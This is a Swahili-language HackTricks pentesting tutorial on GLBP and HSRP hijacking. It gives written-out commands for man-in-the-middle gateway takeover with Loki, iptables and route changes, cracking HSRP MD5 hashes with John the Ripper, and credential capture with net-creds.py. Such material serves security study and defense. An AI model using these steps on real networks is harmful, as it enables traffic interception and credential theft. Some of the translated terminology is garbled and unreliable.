# Mashambulizi ya GLBP & HSRP

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


## Maelezo ya Udukuzi wa FHRP

### Ufahamu kuhusu FHRP
FHRP imeundwa kutoa nguvu kwenye mtandao kwa kuunganisha rutuba nyingi kuwa kitengo kimoja cha kubuni, hivyo kuongeza usambazaji wa mzigo na uvumilivu wa hitilafu. Cisco Systems iliingiza itifaki maarufu katika seti hii, kama vile GLBP na HSRP.

### Ufahamu wa Itifaki ya GLBP
GLBP, ambayo ni ubunifu wa Cisco, inafanya kazi kwenye safu ya TCP/IP, ikitumia UDP kwenye bandari 3222 kwa mawasiliano. Routers katika kikundi cha GLBP hubadilishana pakiti za "hello" kila baada ya sekunde 3. Ikiwa router haiwezi kutuma pakiti hizi kwa sekunde 10, inachukuliwa kuwa haipo. Walakini, timers hizi sio za kudumu na zinaweza kubadilishwa.

### Uendeshaji wa GLBP na Usambazaji wa Mzigo
GLBP inajitokeza kwa kuwezesha usambazaji wa mzigo kati ya routers kwa kutumia anwani moja ya IP ya kubuni na anwani nyingi za MAC za kubuni. Katika kikundi cha GLBP, kila router inashiriki katika kusambaza pakiti. Tofauti na HSRP/VRRP, GLBP inatoa usawa wa mzigo halisi kupitia njia kadhaa:

- **Usawa wa Mzigo Unaotegemea Mwenyeji:** Inaendeleza ugawaji wa anwani ya MAC ya AVF kwa mwenyeji, muhimu kwa usanidi thabiti wa NAT.
- **Usawa wa Mzigo wa Raundi-Robin:** Njia ya msingi, inabadilisha ugawaji wa anwani ya MAC ya AVF kati ya wenyewe wanaohitaji.
- **Usawa wa Mzigo wa Raundi-Robin Uliopimwa:** Inasambaza mzigo kulingana na metriki za "Uzito" zilizopangwa mapema.

### Vipengele na Istilahi muhimu katika GLBP
- **AVG (Lango la Kivinjari cha Kazi):** Router kuu, inayowajibika kwa kugawa anwani za MAC kwa routers wenzake.
- **AVF (Mbeba Mbele wa Kivinjari cha Kazi):** Router iliyoteuliwa kusimamia trafiki ya mtandao.
- **Kipaumbele cha GLBP:** Metriki inayodetermini AVG, ikitoka kwa chaguo-msingi ya 100 na kati ya 1 na 255.
- **Uzito wa GLBP:** Inaonyesha mzigo wa sasa kwenye router, inayoweza kurekebishwa kwa mkono au kupitia Ufuatiliaji wa Vitu.
- **Anwani ya IP ya Kivinjari cha Kazi cha GLBP:** Inatumika kama lango la chaguo-msingi la mtandao kwa vifaa vyote vilivyounganishwa.

Kwa mwingiliano, GLBP inatumia anwani ya multicast iliyohifadhiwa 224.0.0.102 na bandari ya UDP 3222. Routers hutoa pakiti za "hello" kila baada ya sekunde 3, na huchukuliwa kuwa hazifanyi kazi ikiwa pakiti inakosekana kwa kipindi cha sekunde 10.

### Mbinu ya Mashambulizi ya GLBP
Mshambuliaji anaweza kuwa router kuu kwa kutuma pakiti ya GLBP na thamani ya kipaumbele iliyo juu kabisa (255). Hii inaweza kusababisha mashambulizi ya DoS au MITM, kuruhusu kuvizia au kuelekeza trafiki.

### Kutekeleza Mashambulizi ya GLBP na Loki
[Loki](https://github.com/raizo62/loki_on_kali) inaweza kutekeleza mashambulizi ya GLBP kwa kuingiza pakiti na kipaumbele na uzito uliowekwa kuwa 255. Hatua za kabla ya mashambulizi zinahusisha kukusanya habari kama vile anwani ya IP ya kubuni, uwepo wa uwakiki, na thamani za kipaumbele za router kwa kutumia zana kama Wireshark.

Hatua za Mashambulizi:
1. Badilisha kwa hali ya promiscuous na wezesha IP forwarding.
2. Tambua router lengwa na pata anwani yake ya IP.
3. Jenga Gratuitous ARP.
4. Ingiza pakiti ya GLBP yenye nia mbaya, ukiiga AVG.
5. Weka anwani ya IP ya pili kwenye kiolesura cha mtandao cha mshambuliaji, ikifanana na anwani ya IP ya kubuni ya GLBP.
6. Tekeleza SNAT kwa uonekano kamili wa trafiki.
7. Badilisha njia ya kuendelea kuhakikisha upatikanaji wa mtandao kupitia router ya AVG ya asili.

Kwa kufuata hatua hizi, mshambuliaji anajipanga kama "mtu katikati," anayeweza kuvizia na kuchambua trafiki ya mtandao, ikiwa ni pamoja na data isiyosimbwa au nyeti.

Kwa mfano, hapa kuna vipande vya amri vinavyohitajika:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Ufuatiliaji na kuvamia trafiki unaweza kufanywa kwa kutumia net-creds.py au zana kama hizo kwa kukamata na kuchambua data inayopita kupitia mtandao ulioathiriwa.

### Maelezo ya Kupita kwa HSRP Hijacking na Maelezo ya Amri

#### Muhtasari wa HSRP (Hot Standby Router/Redundancy Protocol)
HSRP ni itifaki ya kipekee ya Cisco iliyoundwa kwa ajili ya redundansi ya lango la mtandao. Inaruhusu usanidi wa rutuba nyingi za kimwili kuwa kifaa kimoja mantiki chenye anwani ya IP iliyoshirikiwa. Kifaa hiki mantiki kinasimamiwa na rutuba ya kwanza inayohusika na usimamizi wa trafiki. Tofauti na GLBP, ambayo hutumia vipimo kama kipaumbele na uzito kwa usawa wa mzigo, HSRP inategemea rutuba moja tu inayofanya kazi kama msimamizi wa trafiki.

#### Majukumu na Istilahi katika HSRP
- **Rutuba ya HSRP**: Kifaa kinachofanya kazi kama lango, kusimamia mtiririko wa trafiki.
- **Rutuba ya HSRP ya HSRP**: Rutuba ya akiba, tayari kuchukua nafasi ikiwa rutuba ya kwanza itashindwa.
- **Kikundi cha HSRP**: Seti ya rutuba zinazoshirikiana kuunda rutuba ya kawaida ya kawaida.
- **Anwani ya MAC ya HSRP**: Anwani ya MAC ya kubuni iliyopewa rutuba mantiki katika usanidi wa HSRP.
- **Anwani ya IP ya HSRP ya HSRP**: Anwani ya IP ya kawaida ya kikundi cha HSRP, inayofanya kazi kama lango la chaguo-msingi kwa vifaa vilivyounganishwa.

#### Toleo la HSRP
HSRP inakuja katika toleo mbili, HSRPv1 na HSRPv2, tofauti kuu ikiwa ni uwezo wa kikundi, matumizi ya IP ya multicast, na muundo wa anwani ya MAC ya kubuni. Itifaki hutumia anwani maalum ya IP ya multicast kwa kubadilishana habari ya huduma, na pakiti za Hello zinatumwa kila baada ya sekunde 3. Rutuba inachukuliwa kuwa haifanyi kazi ikiwa hakuna pakiti inayopokelewa ndani ya kipindi cha sekunde 10.

#### Mbinu ya Shambulio la HSRP
Shambulio la HSRP linahusisha kuchukua jukumu la Rutuba ya HSRP ya HSRP kwa kuingiza thamani ya kipaumbele ya juu kabisa. Hii inaweza kusababisha shambulio la Man-In-The-Middle (MITM). Hatua muhimu kabla ya shambulio ni kukusanya data kuhusu usanidi wa HSRP, ambayo inaweza kufanywa kwa kutumia Wireshark kwa uchambuzi wa trafiki.

#### Hatua za Kupita kwa Uthibitishaji wa HSRP
1. Hifadhi trafiki ya mtandao inayohusisha data ya HSRP kama faili ya .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Chambua hashi za MD5 kutoka kwenye faili ya .pcap kwa kutumia hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Gonga hashi za MD5 kwa kutumia John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Kutekeleza Uingizaji wa HSRP na Loki**

1. Anzisha Loki ili kutambua matangazo ya HSRP.
2. Weka kiolesura cha mtandao kwenye hali ya promiscuous na kuwezesha IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Tumia Loki kulenga rutuba maalum, ingiza nenosiri la HSRP lililovunjwa, na fanya usanidi unaohitajika kuiga Rutuba ya HSRP ya HSRP.
4. Baada ya kupata jukumu la Rutuba ya HSRP ya HSRP, sanidi kiolesura chako cha mtandao na meza za IP kwa kukamata trafiki halali.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Badilisha meza ya uhamishaji kuelekeza trafiki kupitia Rutuba ya HSRP ya zamani.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Tumia net-creds.py au zana kama hiyo kuchukua vibali kutoka kwenye trafiki iliyokamatwa.
```shell
sudo python2 net-creds.py -i eth0
```

Kutekeleza hatua hizi humpa mshambuliaji nafasi ya kukamata na kubadilisha trafiki, kama ilivyo kwa utaratibu wa kuteka GLBP. Hii inaonyesha udhaifu katika itifaki za redundansi kama HSRP na umuhimu wa hatua madhubuti za usalama.
